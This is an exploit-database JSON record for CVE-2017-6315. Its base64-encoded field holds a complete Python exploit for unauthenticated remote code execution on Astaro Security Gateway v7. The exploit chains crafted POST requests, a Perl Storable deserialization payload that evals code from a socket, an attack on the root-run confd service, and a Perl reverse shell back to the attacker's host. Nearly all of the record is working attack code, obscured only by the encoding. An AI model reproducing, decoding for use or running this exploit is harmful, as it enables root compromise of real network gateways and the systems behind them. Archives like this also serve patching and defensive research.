{
    "source": "exploit-database", 
    "exploit": "IyEvdXNyL2Jpbi9weXRob24NCg0KIyBBc3Rhcm8gU2VjdXJpdHkgR2F0ZXdheSB2NyAtIFVuYXV0aGVudGljYXRlZCBSZW1vdGUgQ29kZSBFeGVjdXRpb24NCiMgRXhwbG9pdCBBdXRob3JzOiBKYWt1YiBQYWxhY3p5bnNraSBhbmQgTWFjaWVqIEdyYWJpZWMNCiMgVGVzdGVkIG9uIHZlcnNpb25zOiA3LjUwMCBhbmQgNy41MDYNCiMgRGF0ZTogMTMuMTIuMjAxNg0KIyBWZW5kb3IgSG9tZXBhZ2U6IGh0dHBzOi8vd3d3LnNvcGhvcy5jb20vDQojIENWRTogQ1ZFLTIwMTctNjMxNQ0KDQppbXBvcnQgc29ja2V0DQppbXBvcnQgc3lzDQppbXBvcnQgb3MNCmltcG9ydCB0aHJlYWRpbmcNCmltcG9ydCBzdWJwcm9jZXNzDQppbXBvcnQgdGltZQ0KDQojIHByaW50IGhlbHAgb3IgYXNzaWduIGFyZ3VtZW50cw0KaWYgbGVuKHN5cy5hcmd2KSAhPSAzOg0KICAgIHN5cy5zdGRlcnIud3JpdGUoIlstXVVzYWdlOiBweXRob24gJXMgPG91cl9pcD4gPHJlbW90ZV9pcDpwb3J0PlxuIiAlIHN5cy5hcmd2WzBdKQ0KICAgIHN5cy5zdGRlcnIud3JpdGUoIlstXUV4ZW1wbGU6IHB5dGhvbiAlcyAxOTIuMTY4LjEuMSAxOTIuMTY4LjEuMjo0NDQ0XG4iICUgc3lzLmFyZ3ZbMF0pDQogICAgc3lzLmV4aXQoMSkNCg0KbGhvc3QgPSBzeXMuYXJndlsxXSAjIG91ciBpcCBhZGRyZXNzDQpyaG9zdCA9IHN5cy5hcmd2WzJdICMgaXAgYWRkcmVzcyBhbmQgcG9ydCBvZiB2dWxuZXJhYmxlIEFTRyB2Nw0KDQojIGZvciBhZGRpdGlvbmFsIHRocmVhZCB0byBzZW5kIHJlcXVlc3RzIGluIHBhcmFsbGVsDQpjbGFzcyByZXF1ZXN0cyAodGhyZWFkaW5nLlRocmVhZCk6DQogICAgZGVmIHJ1bihzZWxmKToNCiAgICAgICAgcHJpbnQgJ1NlbmRpbmcgcmVxdWVzdHMgdG8gdHJpZ2dlciB2dWxuZXJhYmlsaXR5LicNCiAgICAgICAgdGltZS5zbGVlcCg1KQ0KICAgICAgICAjIGZpcnN0IHJlcXVlc3QgdG8gY2xlYXIgY2FjaGUNCiAgICAgICAgb3Muc3lzdGVtKCdjdXJsIC1zIC1tIDUgLVggUE9TVCBodHRwczovLycgKyByaG9zdCArICcvaW5kZXgucGx4IC1kIFwneyJvYmpzIjogW3siRklEIjogImluaXQifV0sImJhY2tlbmRfYWRkcmVzcyI6ICInICsgbGhvc3QgKyAnOjgxIn1cJyAtayA+IC9kZXYvbnVsbCcpDQogICAgICAgICMgc2Vjb25kIHJlcXVlc3QgdG8gdHJpZ2dlciByZXZlcnNlIGNvbm5lY3Rpb24NCiAgICAgICAgb3Muc3lzdGVtKCdjdXJsIC1zIC1tIDIwIC1YIFBPU1QgaHR0cHM6Ly8nICsgcmhvc3QgKyAnL2luZGV4LnBseCAtZCBcJ3sib2JqcyI6IFt7IkZJRCI6ICJpbml0In1dLCJiYWNrZW5kX2FkZHJlc3MiOiAiJyArIGxob3N0ICsgJzo4MCJ9XCcgLWsgPiAvZGV2L251bGwnKQ0KDQojIGZ1bmN0aW9uIHRoYXQgY3JlYXRlcyBzb2NrZXQNCmRlZiBjcmVhdGVfc29ja2V0KHBvcnQpOg0KICAgIHNvY2sgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pDQogICAgc29jay5zZXRzb2Nrb3B0KHNvY2tldC5TT0xfU09DS0VULCBzb2NrZXQuU09fUkVVU0VBRERSLCAxKQ0KICAgIHNvY2suYmluZCgoJzAuMC4wLjAnLCBwb3J0KSkNCiAgICBzb2NrLmxpc3RlbigxMCkNCiAgICBjb25uLCBhZGRyID0gc29jay5hY2NlcHQoKQ0KICAgIHJldHVybiBzb2NrLCBjb25uLCBhZGRyDQoNCiMgZnVuY3Rpb24gdG8gcmVjZWl2ZSBkYXRhIGZyb20gc29ja2V0DQpkZWYgcmVjZWl2ZShjb25uKToNCiAgICBzeXMuc3Rkb3V0LndyaXRlKGNvbm4ucmVjdigxMDI0KSkNCiAgICBzeXMuc3Rkb3V0LmZsdXNoKCkNCiAgICBzeXMuc3Rkb3V0LndyaXRlKGNvbm4ucmVjdigxMDI0KSkNCiAgICBzeXMuc3Rkb3V0LmZsdXNoKCkNCg0KIyBUaGFua3MgdG8gQWdhcnJpOiBodHRwOi8vd3d3LmFnYXJyaS5mci9kb2NzL1BvQ190aGF3X3Blcmw1OC5wbA0KIyBUaGlzIHNjcmlwdCBjcmVhdGVzIHNlcmlhbGl6ZWQgb2JqZWN0IHRoYXQgbWFrZXMgcmV2ZXJzZSBjb25uZWN0aW9uIGFuZCBleGVjdXRlcyBldmVyeXRoaW5nIHdoYXQgaXQgcmVjZWl2ZXMgb24gYSBzb2NrZXQNCmZpbGUgPSAiIiINCiMhL3Vzci9iaW4vcGVybA0KDQp1c2Ugc3RyaWN0Ow0KdXNlIE1JTUU6OkJhc2U2NCBxdyggZW5jb2RlX2Jhc2U2NCApOw0KdXNlIFN0b3JhYmxlIHF3KCBuZnJlZXplICk7DQp1c2UgTFdQOjpVc2VyQWdlbnQ7DQoNCm15ICRwYWNrYWdlX25hbWUgPSAiQSIgeCAyNTI7DQpteSAkcGFjayA9IHFxfnsgcGFja2FnZSAkcGFja2FnZV9uYW1lOyBzdWIgU1RPUkFCTEVfZnJlZXplIHsgcmV0dXJuIDE7IH0gfX47DQpldmFsKCRwYWNrKTsNCg0KbXkgJHBheWxvYWQgPSBxcX5QT1NJWDtldmFsKCdzbGVlcCgxMCk7dXNlIElPOjpTb2NrZXQ6OklORVQ7XCRyPUlPOjpTb2NrZXQ6OklORVQtPm5ldyhcIiIiIiArIGxob3N0ICsgIiIiOjQ0MyIpO2lmIChcJHIpIHtldmFsKDxcJHI+KTt9Jyk7ZXhpdDt+Ow0KDQpteSAkcGFkZGluZyA9IGxlbmd0aCgkcGFja2FnZV9uYW1lKSAtIGxlbmd0aCgkcGF5bG9hZCk7DQokcGF5bG9hZCA9ICRwYXlsb2FkIC4gKCI7IiB4ICRwYWRkaW5nKTsNCm15ICRkYXRhID0gYmxlc3MgeyBpZ25vcmUgPT4gJ3RoaXMnIH0sICRwYWNrYWdlX25hbWU7DQpteSAkZnJvemVuID0gbmZyZWV6ZSgkZGF0YSk7DQokZnJvemVuID1+IHMvJHBhY2thZ2VfbmFtZS8kcGF5bG9hZC9nOw0KbXkgJGVuY29kZWRTaXplID0gbGVuZ3RoKCRmcm96ZW4pOw0KbXkgJHBha2lldCA9IHByaW50KHBhY2soIk4iLCAkZW5jb2RlZFNpemUpLCAkZnJvemVuKTsNCnByaW50ICIkZnJvemVuIjsNCiIiIg0KDQojIHNhdmUgZmlsZSwgcnVuIHBlcmwgc2NyaXB0IGFuZCBzYXZlIG91ciBzZXJpYWxpemVkIHBheWxvYWQNCmYgPSBvcGVuKCJwYXlsb2FkLnBsIiwgInciKQ0KZi53cml0ZShmaWxlKQ0KZi5jbG9zZSgpDQoNCnNlcmlhbGl6ZWQgPSBvcy5wb3BlbigicGVybCAuL3BheWxvYWQucGwiKS5yZWFkKCkNCm9zLnJlbW92ZSgiLi9wYXlsb2FkLnBsIikNCg0KIyBzdGFydCB0aHJlYWQgdGhhdCBzZW5kcyByZXF1ZXN0cw0KdGhyZWFkID0gcmVxdWVzdHMoKQ0KdGhyZWFkLnN0YXJ0KCkNCg0KIyBvcGVuIHNvY2tldCB0aGF0IHJlY2VpdmVzIGNvbm5lY3Rpb24gZnJvbSBpbmRleA0Kc29jaywgY29ubiwgYWRkciA9IGNyZWF0ZV9zb2NrZXQoODApDQpwcmludCAnUmVjZWl2ZWQgY29ubmVjdGlvbiBmcm9tOiAnICsgYWRkclswXSArICc6JyArIHN0cihhZGRyWzFdKSArICcuJw0KcHJpbnQgJ1NlbmRpbmcgMXN0IHN0YWdlIHBheWxvYWQuJw0KZGF0YSA9IGNvbm4ucmVjdigyNTYpDQojIHNheSBoZWxsbyB0byBSUEMgY2xpZW50DQpjb25uLnNlbmRhbGwoZGF0YSkNCmRhdGEgPSBjb25uLnJlY3YoMjU2KQ0KIyBzZW5kIHNlcmlhbGl6ZWQgb2JqZWN0IHRoYXQgaW5pdGlhdGVzIGNvbm5lY3QgYmFjayBjb25uZWN0aW9uIGFuZCBleGVjdXRlcyBldmVyeXRoaW5nIHdoYXQgaXQgcmVjZWl2ZXMgb24gYSBzb2NrZXQNCmNvbm4uc2VuZGFsbChzZXJpYWxpemVkKQ0Kc29jay5jbG9zZSgpDQoNCiMgY3JlYXRlIHNlY29uZCBzb2NrZXQgdGhhdCByZWNlaXZlcyBjb25uZWN0aW9uIGZyb20gaW5kZXggYW5kIHNlbmRzIGFkZGl0aW9uYWwgY29tbWFuZHMNCnNvY2ssIGNvbm4sIGFkZHIgPSBjcmVhdGVfc29ja2V0KDQ0MykNCnByaW50ICdTZW5kaW5nIDJuZCBzdGFnZSBwYXlsb2FkLicNCiMgc2VuZCBjb21tYW5kcyB0aGF0IGV4cGxvaXQgY29uZmQgKHJ1bm5pbmcgd2l0aCByb290IHBlcm1pc3Npb25zKSB3aGljaCBpcyBydW5uaW5nIG9uIGxvY2FsaG9zdCAtIHRoZSBzYW1lIGV4cGxvaXRhdGlvbiBhcyBmb3IgZmlyc3Qgc3RhZ2UNCmNvbm4uc2VuZGFsbCgnc2xlZXAoMTApO3VzZSBJTzo6U29ja2V0OjpJTkVUO215ICRzID0gbmV3IElPOjpTb2NrZXQ6OklORVQoUGVlckhvc3QgPT4gIjEyNy4wLjAuMSIsUGVlclBvcnQgPT4gIjQ0NzIiLFByb3RvID0+ICJ0Y3AiKTskcy0+c2VuZCgiXFx4MDBcXHgwMFxceDAwXFx4MWRcXHgwNVxceDA2XFx4MDJcXHgwMFxceDAwXFx4MDBcXHgwNFxceDBhXFx4MDRcXHg3MFxceDcyXFx4NzBcXHg2M1xceDBhXFx4MDRcXHgzMFxceDJlXFx4MzBcXHgzMVxceDBhXFx4MDZcXHg3M1xceDc5XFx4NzNcXHg3NFxceDY1XFx4NmRcXHgwYVxceDAwIik7bXkgJGE7JHMtPnJlY3YoJGEsMTAyNCk7JHMtPnNlbmQoIicgKyAiXFx4IiArICJcXHgiLmpvaW4oIns6MDJ4fSIuZm9ybWF0KG9yZChjKSkgZm9yIGMgaW4gc2VyaWFsaXplZCkgKyAnIik7JHMtPnJlY3YoJGEsMTAyNCk7JHMtPmNsb3NlKCk7XG4nKQ0Kc29jay5jbG9zZSgpDQoNCiMgY3JlYXRlIHNvY2tldCB0aGF0IHJlY2VpdmVzIGNvbm5lY3Rpb24gZnJvbSBjb25mZCBhbmQgc2VuZHMgY29tbWFuZHMgdG8gZ2V0IHJldmVyc2Ugc2hlbGwNCnNvY2ssIGNvbm4sIGFkZHIgPSBjcmVhdGVfc29ja2V0KDQ0MykNCnByaW50ICdTZW5kaW5nIDNyZCBzdGFnZSBwYXlsb2FkLicNCiMgc2VuZCByZXZlcnNlIHNoZWxsIHBheWxvYWQNCmNvbm4uc2VuZGFsbCgnc2xlZXAoMjApO3VzZSBTb2NrZXQ7JGk9IicgKyBsaG9zdCArICciOyRwPTQ0Mztzb2NrZXQoUyxQRl9JTkVULFNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCJ0Y3AiKSk7aWYoY29ubmVjdChTLHNvY2thZGRyX2luKCRwLGluZXRfYXRvbigkaSkpKSl7b3BlbihTVERJTiwiPiZTIik7b3BlbihTVERPVVQsIj4mUyIpO29wZW4oU1RERVJSLCI+JlMiKTtleGVjKCIvYmluL3NoIC1pIik7fTtcbicpDQpzb2NrLmNsb3NlKCkNCg0KIyBjcmVhdGUgc29ja2V0IHRvIHJlY2VpdmUgc2hlbGwgd2l0aCByb290IHBlcm1pc3Npb25zDQpwcmludCAnXG5Ob3cgeW91IG5lZWQgdG8gd2FpdCBmb3Igc2hlbGwuJw0Kc29jaywgY29ubiwgYWRkciA9IGNyZWF0ZV9zb2NrZXQoNDQzKQ0KcmVjZWl2ZShjb25uKQ0Kd2hpbGUgVHJ1ZToNCiAgICBjbWQgPSByYXdfaW5wdXQoIiIpDQogICAgaWYgY21kID09ICdleGl0JzoNCiAgICAgICAgYnJlYWsNCiAgICBlbHNlOg0KICAgICAgICBjb25uLnNlbmQoY21kICsgIlxuIikNCiAgICAgICAgcmVjZWl2ZShjb25uKQ0Kc29jay5jbG9zZSgpDQo=", 
    "filename": "platforms/hardware/remote/42726.py", 
    "id": "42726", 
    "cves": [
        "CVE-2017-6315"
    ]
}